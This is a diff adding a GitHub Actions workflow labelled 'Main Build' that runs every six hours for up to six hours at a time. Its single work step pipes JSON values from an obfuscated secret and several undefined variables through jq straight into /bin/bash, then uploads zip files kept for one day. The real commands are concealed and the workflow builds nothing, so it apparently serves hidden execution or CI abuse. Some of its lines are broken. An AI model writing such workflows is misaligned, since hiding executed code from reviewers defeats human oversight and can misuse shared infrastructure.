@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          biqb88378: ${{ secrets.biqb88378 }}
+        run: |
+          printf '%s' "$biqb88378" | jq -r .opzrc743 | /bin/bash
+          printf '%s' "$t9" | jq -r .qqbsl948 | /bin/bash
+          printf '%s' "$k60009" | jq -r .taz18 | /bin/bash
+          echo $zl9 | jq -r .fynhv5035 | /bin/bash
+          echo $twhgg54 | jq -r .bszu09641 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: UU6x0D8A
+          path: "*.zip"
+          retention-days: 1
